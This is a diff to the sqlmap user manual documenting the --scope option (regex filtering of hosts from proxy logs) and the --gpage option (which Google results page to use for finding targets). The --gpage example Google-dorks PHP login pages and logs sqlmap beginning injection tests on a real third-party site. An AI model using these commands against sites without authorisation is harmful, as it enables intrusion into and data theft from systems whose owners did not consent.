@@ -1578,7 +1578,16 @@ connection timeouts. By default it retries up to three times.
 
 <p>
 Option: <tt>-</tt><tt>-scope</tt>
-#TODO
+
+<p>
+Rather than using all hosts parsed from provided logs with option 
+<tt>-l</tt>, in combination with this option you can specify valid 
+python regular expression to be used for filtering desired ones.
+
+Example usage:
+
+<tscreen><verb>
+$ python sqlmap.py -l /tmp/webscarab.log/conversations/ --scope="(www)?\.target\.(com|net|org)"
 
 
 <sect1>Injection
@@ -1587,6 +1596,7 @@ Option: <tt>-</tt><tt>-scope</tt>
 These options can be used to specify which parameters to test for, provide
 custom injection payloads and how to parse and compare HTTP responses page
 content when using the blind SQL injection technique.
+
 
 <sect2>Testable parameter(s)
 
@@ -5358,11 +5368,11 @@ back-end DBMS:	Microsoft SQL Server 2000
 [hh:mm:57] [INFO] fetching number of database users
 [hh:mm:57] [INFO] retrieved: 3
 [hh:mm:57] [INFO] retrieved the length of query output: 22
-100% [====================================================] 22/22              
+100% [====================================================] 22/22
 [hh:mm:58] [INFO] retrieved the length of query output: 2
-100% [====================================================] 2/2                
+100% [====================================================] 2/2
 [hh:mm:59] [INFO] retrieved the length of query output: 25
-100% [====================================================] 25/25              
+100% [====================================================] 25/25
 [hh:mm:00] [DEBUG] performed 181 queries in 1 seconds
 database management system users [3]:
 [*] BUILTIN\Administrators
@@ -5380,7 +5390,42 @@ counts the number of retrieved query output characters.
 
 <p>
 Option: <tt>-</tt><tt>-gpage</tt>
-#TODO
+
+<p>
+Default sqlmap behavior with option <tt>-g</tt> is to do a google
+search and use resulting urls from first (100) result page for further 
+sql injection testing. In combination with this option you can specify
+some other page other than the first one for retrieving target urls.
+
+<p>
+Example of Google dorking with expression <tt>login ext:php</tt> 
+and resulting page set to 3:
+
+<tscreen><verb>
+$ python sqlmap.py -g "login ext:php" --gpage=3 -v 1
+
+[14:11:12] [INFO] first request to Google to get the session cookie
+[14:11:12] [INFO] using search result page #3
+[14:11:12] [INFO] sqlmap got 100 results for your Google dork expression, 5 of them are testable targets
+[14:11:12] [INFO] sqlmap got a total of 5 targets
+url 1:
+GET http://myjobstreet-beta.jobstreet.com/home/login.php?site=in
+do you want to test this url? [Y/n/q]
+> 
+[14:11:14] [INFO] testing url http://myjobstreet-beta.jobstreet.com/home/login.php?site=in
+[14:11:14] [INFO] using '/home/stamparm/Work/sqlmap/sqlmap/output/None/session' as session file
+[14:11:14] [INFO] testing connection to the target url
+[14:11:15] [INFO] testing if the url is stable, wait a few seconds
+[14:11:19] [INFO] url is stable
+[14:11:19] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[14:11:21] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
+[14:11:21] [INFO] testing if Cookie parameter 'REFERP' is dynamic
+[14:11:22] [WARNING] Cookie parameter 'REFERP' is not dynamic
+[14:11:22] [INFO] testing if Cookie parameter 'PHPSESSID' is dynamic
+[14:11:24] [INFO] confirming that Cookie parameter 'PHPSESSID' is dynamic
+[14:11:27] [INFO] Cookie parameter 'PHPSESSID' is dynamic
+[...]
+</verb></tscreen>
 
 
 <sect2>Update <tt>sqlmap</tt>
